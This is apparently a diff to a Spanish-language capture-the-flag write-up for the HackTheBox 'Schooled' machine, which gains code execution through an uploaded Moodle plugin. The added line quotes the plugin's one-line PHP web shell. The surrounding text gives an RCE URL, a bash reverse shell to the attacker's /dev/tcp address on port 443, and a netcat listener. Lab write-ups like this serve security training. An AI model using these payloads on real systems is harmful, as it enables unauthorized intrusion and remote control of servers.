@@ -132,8 +132,10 @@ manteniendo la sesskey, podras editar los plugins.
 
 Te pide un zip, pero el repo del exploit también te lo da.
 Una vez subido, accedes a la ruta ```http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id```
+(luego descomprimi el zip para ver que tenia y era el clasico backdoor en php ```<?php system($_GET['cmd']); ?>```)
 
 ![schooled13](https://user-images.githubusercontent.com/96772264/199316996-965a9335-94b0-409e-a3a4-318b6cf49f35.PNG)
+
 Y pones el comando para la reverse shell con los & urlencodeados a %26
 ```bash -c 'bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261'``` y netcat ```sudo nc -nlvp 443```
 
